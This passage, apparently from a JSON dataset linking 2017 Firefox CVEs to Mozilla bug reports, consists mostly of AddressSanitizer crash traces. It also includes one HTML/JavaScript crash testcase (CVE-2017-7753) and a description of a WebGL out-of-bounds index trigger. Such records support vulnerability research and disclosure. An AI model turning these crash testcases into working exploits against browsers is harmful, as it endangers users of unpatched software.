#28 0x7f2fee3325bf in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:477:15 #29 0x7f2fee332c02 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:523:10 #30 0x7f2fede050ad in JS::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/jsapi.cpp:2828:12 #31 0x7f2fe7b0d7ff in mozilla::dom::EventHandlerNonNull::Call(JSContext*, JS::Handle<JS::Value>, mozilla::dom::Event&, JS::MutableHandle<JS::Value>, mozilla::ErrorResult&) /home/worker/workspace/build/src/obj-firefox/dom/bindings/EventHandlerBinding.cpp:259:37 #32 0x7f2fe850398a in Call<nsISupports *> /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/dom/EventHandlerBinding.h:361:12 #33 0x7f2fe850398a in mozilla::JSEventHandler::HandleEvent(nsIDOMEvent*) /home/worker/workspace/build/src/dom/events/JSEventHandler.cpp:214 #34 0x7f2fe84cf99d in mozilla::EventListenerManager::HandleEventSubType(mozilla::EventListenerManager::Listener*, nsIDOMEvent*, mozilla::dom::EventTarget*) /home/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1134:16 #35 0x7f2fe84d13c7 in mozilla::EventListenerManager::HandleEventInternal(nsPresContext*, mozilla::WidgetEvent*, nsIDOMEvent**, mozilla::dom::EventTarget*, nsEventStatus*) /home/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1287:17 #36 0x7f2fe84bc4f6 in mozilla::EventTargetChainItem::HandleEventTargetChain(nsTArray<mozilla::EventTargetChainItem>&, mozilla::EventChainPostVisitor&, mozilla::EventDispatchingCallback*, mozilla::ELMCreationDetector&) /home/worker/workspace/build/src/dom/events/EventDispatcher.cpp:380:5 #37 0x7f2fe84bfb88 in mozilla::EventDispatcher::Dispatch(nsISupports*, nsPresContext*, mozilla::WidgetEvent*, nsIDOMEvent*, nsEventStatus*, mozilla::EventDispatchingCallback*, nsTArray<mozilla::dom::EventTarget*>*) /home/worker/workspace/build/src/dom/events/EventDispatcher.cpp:711:9 #38 0x7f2fea5f5a8c in nsDocumentViewer::LoadComplete(nsresult) /home/worker/workspace/build/src/layout/base/nsDocumentViewer.cpp:1023:7 SUMMARY: AddressSanitizer: heap-use-after-free /home/worker/workspace/build/src/obj-firefox/dist/include/nsCOMPtr.h:763:45 in operator bool Shadow bytes around the buggy address: 0x0c247fffe410: fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa 0x0c247fffe420: fa fa fa fa fa fa fa fa 00 00 00 00 00 00 00 00 0x0c247fffe430: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0c247fffe440: 00 00 00 00 00 00 00 00 00 fa fa fa fa fa fa fa 0x0c247fffe450: fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd =>0x0c247fffe460: fd fd fd fd fd fd[fd]fd fd fd fd fd fd fd fd fd 0x0c247fffe470: fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa 0x0c247fffe480: fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd 0x0c247fffe490: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c247fffe4a0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fa fa 0x0c247fffe4b0: fa fa fa fa fa fa fa fa 00 00 00 00 00 00 00 00 Shadow byte legend (one shadow byte represents 8 application bytes): Addressable: 00 Partially addressable: 01 02 03 04 05 06 07 Heap left redzone: fa Heap right redzone: fb Freed heap region: fd Stack left redzone: f1 Stack mid redzone: f2 Stack right redzone: f3 Stack partial redzone: f4 Stack after return: f5 Stack use after scope: f8 Global redzone: f9 Global init order: f6 Poisoned by user: f7 Container overflow: fc Array cookie: ac Intra object redzone: bb ASan internal: fe Left alloca redzone: ca Right alloca redzone: cb ==25393==ABORTING"
      }
    ],
    "CVE-2017-7753": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1353312",
        "title": "logical property on pseudo-element that disallows it (e.g., border-inline-* on ::first-line) causes access violation at 0x14141414",
        "description": "Repro: <html> <head> <style id=style> * { float:left; } ::first-line { border-inline-start: 0; } .boom ::first-line { border: 0; } </style> <script> onload = function() { document.body.className=\"boom\"; document.body.offsetTop; alert(\"Click OK to crash Firefox\"); document.body.className=\"x\"; // On x64, this causes an AV, but not on x86: document.body.offsetTop; // On x86, this code is reached. Refreshing the page appears to // trigger the AV the next time the page shows the alert. location.reload(); }; </script> </head> <body> <x>x</x> </body> </html> Applying and removing the `nsRuleNode` for class \"boom\" appears to cause the code to attempt to apply the `nsConditionalResetStyleData` for the `nsRuleNode` with a \"border-inline-start\" property. This data is corrupt in that the `nsConditionalResetStyleData::Entry` instance at index 9 of the `mEntries` property (which deals with CSS border properties) has an `mStyleStruct` member that has the value 0x14141414 (x86) or 0x14141414`14141414 (x64). This causes an AV when the code calls `nsStyleBorder::CalcDifference` with this values as its `aNewData` argument, as that code assumes it is given a pointer to a valid `nsStyleVariables` instance and attempts to access members of this object. I've attempted to find out where this value comes from by looking at various functions in the call stack at the time of the AV, but it appears to have been created before the JavaScript that causes the AV is executed. I've also set breakpoints on various functions that create various objects implicated in this bug, before running the repro, but my understanding of Firefox CSS internals is limited, and I was unable to find out where this value comes from and why. I hope somebody with better understanding of how the code is supposed to work can figure out if this is some kind of \"magic value\" that is not being special cased correctly, or if it's a type confusion where data from a different kind of object is incorrectly interpreted as containing a pointer where it has the value seen in the crash, or something else entirely."
      }
    ],
    "CVE-2017-7754": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1357090",
        "title": "Out-of-bounds array access in WebGLTexture::ImageInfoAtFace",
        "description": "User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36 Steps to reproduce: Tested on: - Mozilla Firefox 52.0.2 (32-bit) on Windows 10 - Nightly 55.0a1 (2017-04-10) (64-bit) on Ubuntu 16.04 LTS Details: dom/canvas/WebGLTexture.h: .. 313 ImageInfo& ImageInfoAtFace(uint8_t face, uint32_t level) { 314 MOZ_ASSERT(face < mFaceCount); 315 MOZ_ASSERT(level < kMaxLevelCount); 316 size_t pos = (level * mFaceCount) + face; 317 return mImageInfoArr[pos]; 318 } .. By supplying a sufficiently large value to 'level' (see the third parameter of gl.texParameterf() in the provided testcase file), it is possible to cause an out-of-bounds array access in line 317. This may result in a bogus ImageInfo object being returned to the calling function, possibly leading to an exploitable state. Provided files: - testcase.html -- Testcase to trigger the issue. - ASAN_output.txt -- Detailed ASAN output (Linux). - WinDbg_output.txt -- Further debugging information (Windows)."
      }
    ],
    "CVE-2017-7756": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1366595",
        "title": "Stack-use-after-scope in NS_strlen while logging errors in XHR",
        "description": "==10811==ERROR: AddressSanitizer: stack-use-after-scope on address 0x7fff25529080 at pc 0x7faccf02f971 bp 0x7fff25527800 sp 0x7fff255277f8 READ of size 2 at 0x7fff25529080 thread T0 (Web Content) SCARINESS: 14 (2-byte-read-stack-use-after-scope) #0 0x7faccf02f970 in NS_strlen(char16_t const*) xpcom/base/nsCRTGlue.cpp:83:23 #1 0x7faccf00d50a in cvt_S(SprintfStateStr*, char16_t const*, int, int, int) xpcom/string/nsTextFormatter.cpp:522:17 #2 0x7faccf0095c1 in dosprintf(SprintfStateStr*, char16_t const*, __va_list_tag*) xpcom/string/nsTextFormatter.cpp:1139:14 #3 0x7faccf00655e in vsmprintf xpcom/string/nsTextFormatter.cpp:1307:8 #4 0x7faccf00655e in nsTextFormatter::smprintf(char16_t const*, ...) xpcom/string/nsTextFormatter.cpp:1265 #5 0x7faccf25fcae in nsStringBundle::FormatString(char16_t const*, char16_t const**, unsigned int, char16_t**) intl/strres/nsStringBundle.cpp:340:5 #6 0x7faccf25fa63 in nsStringBundle::FormatStringFromName(char16_t const*, char16_t const**, unsigned int, char16_t**) intl/strres/nsStringBundle.cpp:188:10 #7 0x7facd1aec35d in nsContentUtils::FormatLocalizedString(nsContentUtils::PropertiesFile, char const*, char16_t const**, unsigned int, nsXPIDLString&) dom/base/nsContentUtils.cpp:3867:18 #8 0x7facd1aecf99 in nsContentUtils::ReportToConsole(unsigned int, nsACString const&, nsIDocument const*, nsContentUtils::PropertiesFile, char const*, char16_t const**, unsigned int, nsIURI*, nsString const&, unsigned int, unsigned int) dom/base/nsContentUtils.cpp:3932:10 #9 0x7facd5ad43a5 in LogMessage dom/xhr/XMLHttpRequestMainThread.cpp:446:3 #10 0x7facd5ad43a5 in mozilla::dom::XMLHttpRequestMainThread::SetRequestHeader(nsACString const&, nsACString const&) dom/xhr/XMLHttpRequestMainThread.cpp:3115 #11 0x7facd5aef3dd in mozilla::dom::XMLHttpRequestMainThread::SetRequestHeader(nsACString const&, nsACString const&, mozilla::ErrorResult&) dom/xhr/XMLHttpRequestMainThread.h:274:11 #12 0x7facd3482163 in mozilla::dom::XMLHttpRequestBinding::setRequestHeader(JSContext*, JS::Handle<JSObject*>, mozilla::dom::XMLHttpRequest*, JSJitMethodCallArgs const&) objdir-ff-asan/dom/bindings/XMLHttpRequestBinding.cpp:461:9 #13 0x7facd3c97445 in mozilla::dom::GenericBindingMethod(JSContext*, unsigned int, JS::Value*) dom/bindings/BindingUtils.cpp:2954:13 #14 0x7facd9daf3a0 in CallJSNative js/src/jscntxtinlines.h:293:15 #15 0x7facd9daf3a0 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) js/src/vm/Interpreter.cpp:470 #16 0x7facd9d8c0dd in CallFromStack js/src/vm/Interpreter.cpp:521:12 #17 0x7facd9d8c0dd in Interpret(JSContext*, js::RunState&) js/src/vm/Interpreter.cpp:3028 #18 0x7facd9d79488 in js::RunScript(JSContext*, js::RunState&) js/src/vm/Interpreter.cpp:410:12 #19 0x7facd9db1a99 in js::ExecuteKernel(JSContext*, JS::Handle<JSScript*>, JSObject&, JS::Value const&, js::AbstractFramePtr, JS::Value*) js/src/vm/Interpreter.cpp:699:15 #20 0x7facd9db2332 in js::Execute(JSContext*, JS::Handle<JSScript*>, JSObject&, JS::Value*) js/src/vm/Interpreter.cpp:731:12 #21 0x7facda7e28a9 in Evaluate(JSContext*, js::ScopeKind, JS::Handle<JSObject*>, JS::ReadOnlyCompileOptions const&, JS::SourceBufferHolder&, JS::MutableHandle<JS::Value>) js/src/jsapi.cpp:4633:19 #22 0x7facda7e3600 in Evaluate js/src/jsapi.cpp:4658:12 #23 0x7facda7e3600 in JS::Evaluate(JSContext*, JS::AutoObjectVector&, JS::ReadOnlyCompileOptions const&, JS::SourceBufferHolder&, JS::MutableHandle<JS::Value>) js/src/jsapi.cpp:4716 #24 0x7facd2011f52 in nsJSUtils::ExecutionContext::CompileAndExec(JS::CompileOptions&, JS::SourceBufferHolder&) dom/base/nsJSUtils.cpp:232:8 #25 0x7facd5b2b722 in mozilla::dom::ScriptLoader::EvaluateScript(mozilla::dom::ScriptLoadRequest*) dom/script/ScriptLoader.cpp:2035:23 #26 0x7facd5b27211 in mozilla::dom::ScriptLoader::ProcessRequest(mozilla::dom::ScriptLoadRequest*) dom/script/ScriptLoader.cpp:1753:10 #27 0x7facd5b0dc57 in mozilla::dom::ScriptLoader::ProcessScriptElement(nsIScriptElement*) dom/script/ScriptLoader.cpp:1455:10 #28 0x7facd5b0a13e in mozilla::dom::ScriptElement::MaybeProcessScript() dom/script/ScriptElement.cpp:149:18 #29 0x7facd10174e0 in AttemptToExecute objdir-ff-asan/dist/include/nsIScriptElement.h:225:18 #30 0x7facd10174e0 in nsHtml5TreeOpExecutor::RunScript(nsIContent*) parser/html/nsHtml5TreeOpExecutor.cpp:698 #31 0x7facd10105c5 in nsHtml5TreeOpExecutor::RunFlushLoop() parser/html/nsHtml5TreeOpExecutor.cpp:499:7 #32 0x7facd101a68b in nsHtml5ExecutorFlusher::Run() parser/html/nsHtml5StreamParser.cpp:129:20 #33 0x7faccf17fe74 in mozilla::SchedulerGroup::Runnable::Run() xpcom/threads/SchedulerGroup.cpp:365:25 #34 0x7faccf1af789 in nsThread::ProcessNextEvent(bool, bool*) xpcom/threads/nsThread.cpp:1302:14 #35 0x7faccf1bb2b0 in NS_ProcessNextEvent(nsIThread*, bool) xpcom/threads/nsThreadUtils.cpp:393:10 #36 0x7faccffeb741 in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) ipc/glue/MessagePump.cpp:96:21 #37 0x7faccff41cbf in RunInternal ipc/chromium/src/base/message_loop.cc:238:10 #38 0x7faccff41cbf in RunHandler ipc/chromium/src/base/message_loop.cc:231 #39 0x7faccff41cbf in MessageLoop::Run() ipc/chromium/src/base/message_loop.cc:211 #40 0x7facd5c4670a in nsBaseAppShell::Run() widget/nsBaseAppShell.cpp:156:27 #41 0x7facd98296fb in XRE_RunAppShell() toolkit/xre/nsEmbedFunctions.cpp:893:22 #42 0x7faccff41cbf in RunInternal ipc/chromium/src/base/message_loop.cc:238:10 #43 0x7faccff41cbf in RunHandler ipc/chromium/src/base/message_loop.cc:231 #44 0x7faccff41cbf in MessageLoop::Run() ipc/chromium/src/base/message_loop.cc:211 #45 0x7facd982918d in XRE_InitChildProcess(int, char**, XREChildData const*) toolkit/xre/nsEmbedFunctions.cpp:709:34 #46 0x5250c2 in content_process_main ipc/contentproc/plugin-container.cpp:64:30 #47 0x5250c2 in main browser/app/nsBrowserApp.cpp:285 #48 0x7face9ebaf44 in __libc_start_main /build/eglibc-MjiXCM/eglibc-2.19/csu/libc-start.c:287 Address 0x7fff25529080 is located in stack of thread T0 (Web Content) at offset 288 in frame #0 0x7facd5ad3dcf in mozilla::dom::XMLHttpRequestMainThread::SetRequestHeader(nsACString const&, nsACString const&) dom/xhr/XMLHttpRequestMainThread.cpp:3090 This frame has 5 object(s): [32, 40) 'doc.i' (line 442) [64, 80) 'ref.tmp.i' (line 446) [96, 192) 'value' (line 3102) [224, 232) 'params' (line 3114) [256, 416) 'ref.tmp' (line 3114) <== Memory access at offset 288 is inside this variable HINT: this may be a false positive if your program uses some custom stack unwind mechanism or swapcontext (longjmp and C++ exceptions *are* supported) SUMMARY: AddressSanitizer: stack-use-after-scope (/mnt/scratch0/clusterfuzz/slave-bot/builds/linux_asan_firefox/custom/firefox/libxul.so+0x1f70970) Shadow bytes around the buggy address: 0x100064a9d1c0: 00 00 00 00 00 00 00 00 f1 f1 f1 f1 00 00 f3 f3 0x100064a9d1d0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x100064a9d1e0: 00 00 00 00 00 00 00 00 00 00 00 00 f1 f1 f1 f1 0x100064a9d1f0: 00 f2 f2 f2 00 00 f2 f2 00 00 00 00 00 00 00 00 0x100064a9d200: 00 00 00 00 f2 f2 f2 f2 00 f2 f2 f2 f8 f8 f8 f8 =>0x100064a9d210:[f8]f8 f8 f8 f8 f8 f8 f8 f8 f8 f8 f8 f8 f8 f8 f8 0x100064a9d220: f3 f3 f3 f3 f3 f3 f3 f3 00 00 00 00 00 00 00 00 0x100064a9d230: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x100064a9d240: f1 f1 f1 f1 00 00 f2 f2 00 00 f2 f2 00 00 f3 f3 0x100064a9d250: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x100064a9d260: 00 00 00 00 f1 f1 f1 f1 00 00 f2 f2 00 00 00 f2 Shadow byte legend (one shadow byte represents 8 application bytes): Addressable: 00 Partially addressable: 01 02 03 04 05 06 07 Heap left redzone: fa Freed heap region: fd Stack left redzone: f1 Stack mid redzone: f2 Stack right redzone: f3 Stack after return: f5 Stack use after scope: f8 Global redzone: f9 Global init order: f6 Poisoned by user: f7 Container overflow: fc Array cookie: ac Intra object redzone: bb ASan internal: fe Left alloca redzone: ca Right alloca redzone: cb ==10811==ABORTING"
      }
    ],
    "CVE-2017-7757": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1356824",
        "title": "AddressSanitizer: heap-use-after-free WRITE of size 4 dom/indexedDB/ActorsParent.cpp:21164:10",
        "description": "User Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3067.0 Safari/537.36 Steps to reproduce: ASAN build 55.0a1 (2017-04-14) (64-bit) I'm trying to identify how this exactly happens (please check if some duplicate issue), any help is appreciated. I can reproduce this issue multiple times, attached two stacktraces with latest Nightly ASAN build: Actual results: ================================================================= ==8636==ERROR: AddressSanitizer: heap-use-after-free on address 0x614000668dc8 at pc 0x7ff0a2b32861 bp 0x7ff03c65c9d0 sp 0x7ff03c65c9c8 WRITE of size 4 at 0x614000668dc8 thread T38 (IPDL Background) #0 0x7ff0a2b32860 in mozilla::dom::indexedDB::(anonymous namespace)::FactoryOp::FinishSendResults() /home/worker/workspace/build/src/dom/indexedDB/ActorsParent.cpp:21164:10 #1 0x7ff0a2b352ea in mozilla::dom::indexedDB::(anonymous namespace)::DeleteDatabaseOp::SendResults() /home/worker/workspace/build/src/dom/indexedDB/ActorsParent.cpp:23283:3 #2 0x7ff0a2a932af in mozilla::dom::indexedDB::(anonymous namespace)::FactoryOp::Run() /home/worker/workspace/build/src/dom/indexedDB/ActorsParent.cpp:21556:7 #3 0x7ff0a2b3305f in mozilla::dom::indexedDB::(anonymous namespace)::DeleteDatabaseOp::NoteDatabaseClosed(mozilla::dom::indexedDB::(anonymous namespace)::Database*) /home/worker/workspace/build/src/dom/indexedDB/ActorsParent.cpp:23247:5 #4 0x7ff0a2ab8b0f in CloseInternal /home/worker/workspace/build/src/dom/indexedDB/ActorsParent.cpp:14495:30 #5 0x7ff0a2ab8b0f in mozilla::dom::indexedDB::(anonymous namespace)::Database::RecvClose() /home/worker/workspace/build/src/dom/indexedDB/ActorsParent.cpp:14948 #6 0x7ff09e420f24 in mozilla::dom::indexedDB::PBackgroundIDBDatabaseParent::OnMessageReceived(IPC::Message const&) /home/worker/workspace/build/src/obj-firefox/ipc/ipdl/PBackgroundIDBDatabaseParent.cpp:431:20 #7 0x7ff09e590f57 in mozilla::ipc::PBackgroundParent::OnMessageReceived(IPC::Message const&) /home/worker/workspace/build/src/obj-firefox/ipc/ipdl/PBackgroundParent.cpp:904:28 #8 0x7ff09e0cb124 in mozilla::ipc::MessageChannel::DispatchAsyncMessage(IPC::Message const&) /home/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:1903:25 #9 0x7ff09e0c7957 in mozilla::ipc::MessageChannel::DispatchMessage(IPC::Message&&) /home/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:1838:17 #10 0x7ff09e0c9d94 in mozilla::ipc::MessageChannel::RunMessage(mozilla::ipc::MessageChannel::MessageTask&) /home/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:1711:5 #11 0x7ff09e0ca396 in mozilla::ipc::MessageChannel::MessageTask::Run() /home/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:1744:15 #12 0x7ff09d3104f0 in nsThread::ProcessNextEvent(bool, bool*) /home/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1269:14 #13 0x7ff09d30cf38 in NS_ProcessNextEvent(nsIThread*, bool) /home/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:389:10 #14 0x7ff09e0d3bff in mozilla::ipc::MessagePumpForNonMainThreads::Run(base::MessagePump::Delegate*) /home/worker/workspace/build/src/ipc/glue/MessagePump.cpp:368:5 #15 0x7ff09e039070 in RunInternal /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:238:10 #16 0x7ff09e039070 in RunHandler /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:231 #17 0x7ff09e039070 in MessageLoop::Run() /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:211 #18 0x7ff09d30991f in nsThread::ThreadFunc(void*) /home/worker/workspace/build/src/xpcom/threads/nsThread.cpp:500:11 #19 0x7ff0b6ad8c93 in _pt_root /home/worker/workspace/build/src/nsprpub/pr/src/pthreads/ptthread.c:216:5 #20 0x7ff0ba3d66c9 in start_thread (/lib64/libpthread.so.0+0x76c9) #21 0x7ff0b945cf7e in __GI___clone (/lib64/libc.so.6+0x107f7e) 0x614000668dc8 is located 392 bytes inside of 448-byte region [0x614000668c40,0x614000668e00) freed by thread T38 (IPDL Background) here: #0 0x4bb44b in __interceptor_free /builds/slave/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:47:3 #1 0x7ff09d31a093 in mozilla::Runnable::Release() /home/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:40:1 #2 0x7ff0a2b326c2 in Release /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/RefPtr.h:40:11 #3 0x7ff0a2b326c2 in Release /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/RefPtr.h:395 #4 0x7ff0a2b326c2 in ~RefPtr /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/RefPtr.h:78 #5 0x7ff0a2b326c2 in Destruct /home/worker/workspace/build/src/obj-firefox/dist/include/nsTArray.h:560 #6 0x7ff0a2b326c2 in DestructRange /home/worker/workspace/build/src/obj-firefox/dist/include/nsTArray.h:2007 #7 0x7ff0a2b326c2 in RemoveElementsAt /home/worker/workspace/build/src/obj-firefox/dist/include/nsTArray.h:2055 #8 0x7ff0a2b326c2 in RemoveElementAt /home/worker/workspace/build/src/obj-firefox/dist/include/nsTArray.h:1730 #9 0x7ff0a2b326c2 in RemoveElement<mozilla::dom::indexedDB::(anonymous namespace)::FactoryOp *, nsDefaultComparator<RefPtr<mozilla::dom::indexedDB::(anonymous namespace)::FactoryOp>, mozilla::dom::indexedDB::(anonymous namespace)::FactoryOp *> > /home/worker/workspace/build/src/obj-firefox/dist/include/nsTArray.h:1756 #10 0x7ff0a2b326c2 in RemoveElement<mozilla::dom::indexedDB::(anonymous namespace)::FactoryOp *> /home/worker/workspace/build/src/obj-firefox/dist/include/nsTArray.h:1765 #11 0x7ff0a2b326c2 in mozilla::dom::indexedDB::(anonymous namespace)::FactoryOp::FinishSendResults() /home/worker/workspace/build/src/dom/indexedDB/ActorsParent.cpp:21158 #12 0x7ff0a2b352ea in mozilla::dom::indexedDB::(anonymous namespace)::DeleteDatabaseOp::SendResults() /home/worker/workspace/build/src/dom/indexedDB/ActorsParent.cpp:23283:3 #13 0x7ff0a2a932af in mozilla::dom::indexedDB::(anonymous namespace)::FactoryOp::Run() /home/worker/workspace/build/src/dom/indexedDB/ActorsParent.cpp:21556:7 #14 0x7ff0a2b3305f in mozilla::dom::indexedDB::(anonymous namespace)::DeleteDatabaseOp::NoteDatabaseClosed(mozilla::dom::indexedDB::(anonymous namespace)::Database*) /home/worker/workspace/build/src/dom/indexedDB/ActorsParent.cpp:23247:5 #15 0x7ff0a2ab8b0f in CloseInternal /home/worker/workspace/build/src/dom/indexedDB/ActorsParent.cpp:14495:30 #16 0x7ff0a2ab8b0f in mozilla::dom::indexedDB::(anonymous namespace)::Database::RecvClose() /home/worker/workspace/build/src/dom/indexedDB/ActorsParent.cpp:14948 #17 0x7ff09e420f24 in mozilla::dom::indexedDB::PBackgroundIDBDatabaseParent::OnMessageReceived(IPC::Message const&) /home/worker/workspace/build/src/obj-firefox/ipc/ipdl/PBackgroundIDBDatabaseParent.cpp:431:20 #18 0x7ff09e590f57 in mozilla::ipc::PBackgroundParent::OnMessageReceived(IPC::Message const&) /home/worker/workspace/build/src/obj-firefox/ipc/ipdl/PBackgroundParent.cpp:904:28 #19 0x7ff09e0cb124 in mozilla::ipc::MessageChannel::DispatchAsyncMessage(IPC::Message const&) /home/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:1903:25 #20 0x7ff09e0c7957 in mozilla::ipc::MessageChannel::DispatchMessage(IPC::Message&&) /home/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:1838:17 #21 0x7ff09e0c9d94 in mozilla::ipc::MessageChannel::RunMessage(mozilla::ipc::MessageChannel::MessageTask&) /home/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:1711:5 #22 0x7ff09e0ca396 in mozilla::ipc::MessageChannel::MessageTask::Run() /home/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:1744:15 #23 0x7ff09d3104f0 in nsThread::ProcessNextEvent(bool, bool*) /home/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1269:14 #24 0x7ff09d30cf38 in NS_ProcessNextEvent(nsIThread*, bool) /home/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:389:10 #25 0x7ff09e0d3bff in mozilla::ipc::MessagePumpForNonMainThreads::Run(base::MessagePump::Delegate*) /home/worker/workspace/build/src/ipc/glue/MessagePump.cpp:368:5 #26 0x7ff09e039070 in RunInternal /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:238:10 #27 0x7ff09e039070 in RunHandler /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:231 #28 0x7ff09e039070 in MessageLoop::Run() /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:211 #29 0x7ff09d30991f in nsThread::ThreadFunc(void*) /home/worker/workspace/build/src/xpcom/threads/nsThread.cpp:500:11 #30 0x7ff0b6ad8c93 in _pt_root /home/worker/workspace/build/src/nsprpub/pr/src/pthreads/ptthread.c:216:5 #31 0x7ff0ba3d66c9 in start_thread (/lib64/libpthread.so.0+0x76c9) previously allocated by thread T38 (IPDL Background) here: #0 0x4bb79c in malloc /builds/slave/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:64:3 #1 0x4ec75d in moz_xmalloc /home/worker/workspace/build/src/memory/mozalloc/mozalloc.cpp:83:17 #2 0x7ff0a2a917dc in operator new /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/mozalloc.h:194:12 #3 0x7ff0a2a917dc in mozilla::dom::indexedDB::(anonymous namespace)::Factory::AllocPBackgroundIDBFactoryRequestParent(mozilla::dom::indexedDB::FactoryRequestParams const&) /home/worker/workspace/build/src/dom/indexedDB/ActorsParent.cpp:14056 #4 0x7ff09e540623 in mozilla::dom::indexedDB::PBackgroundIDBFactoryParent::OnMessageReceived(IPC::Message const&) /home/worker/workspace/build/src/obj-firefox/ipc/ipdl/PBackgroundIDBFactoryParent.cpp:234:21 #5 0x7ff09e590f57 in mozilla::ipc::PBackgroundParent::OnMessageReceived(IPC::Message const&) /home/worker/workspace/build/src/obj-firefox/ipc/ipdl/PBackgroundParent.cpp:904:28 #6 0x7ff09e0cb124 in mozilla::ipc::MessageChannel::DispatchAsyncMessage(IPC::Message const&) /home/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:1903:25 #7 0x7ff09e0c7957 in mozilla::ipc::MessageChannel::DispatchMessage(IPC::Message&&) /home/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:1838:17 #8 0x7ff09e0c9d94 in mozilla::ipc::MessageChannel::RunMessage(mozilla::ipc::MessageChannel::MessageTask&) /home/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:1711:5 #9 0x7ff09e0ca396 in mozilla::ipc::MessageChannel::MessageTask::Run() /home/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:1744:15 #10 0x7ff09d3104f0 in nsThread::ProcessNextEvent(bool, bool*) /home/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1269:14 #11 0x7ff09d30cf38 in NS_ProcessNextEvent(nsIThread*, bool) /home/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:389:10 #12 0x7ff09e0d3bff in mozilla::ipc::MessagePumpForNonMainThreads::Run(base::MessagePump::Delegate*) /home/worker/workspace/build/src/ipc/glue/MessagePump.cpp:368:5 #13 0x7ff09e039070 in RunInternal /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:238:10 #14 0x7ff09e039070 in RunHandler /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:231 #15 0x7ff09e039070 in MessageLoop::Run() /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:211 #16 0x7ff09d30991f in nsThread::ThreadFunc(void*) /home/worker/workspace/build/src/xpcom/threads/nsThread.cpp:500:11 #17 0x7ff0b6ad8c93 in _pt_root /home/worker/workspace/build/src/nsprpub/pr/src/pthreads/ptthread.c:216:5 #18 0x7ff0ba3d66c9 in start_thread (/lib64/libpthread.so.0+0x76c9) Thread T38 (IPDL Background) created by T0 here: #0 0x4a3b76 in __interceptor_pthread_create /builds/slave/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_interceptors.cc:245:3 #1 0x7ff0b6ad5a39 in _PR_CreateThread /home/worker/workspace/build/src/nsprpub/pr/src/pthreads/ptthread.c:457:14 #2 0x7ff0b6ad564e in PR_CreateThread /home/worker/workspace/build/src/nsprpub/pr/src/pthreads/ptthread.c:548:12 #3 0x7ff09d30b657 in nsThread::Init(nsACString const&) /home/worker/workspace/build/src/xpcom/threads/nsThread.cpp:680:8 #4 0x7ff09d314f3b in nsThreadManager::NewNamedThread(nsACString const&, unsigned int, nsIThread**) /home/worker/workspace/build/src/xpcom/threads/nsThreadManager.cpp:268:22 #5 0x7ff09d316f03 in NS_NewNamedThread(nsACString const&, nsIThread**, nsIRunnable*, unsigned int) /home/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:105:45 #6 0x7ff09e0a1529 in NS_NewNamedThread<16> 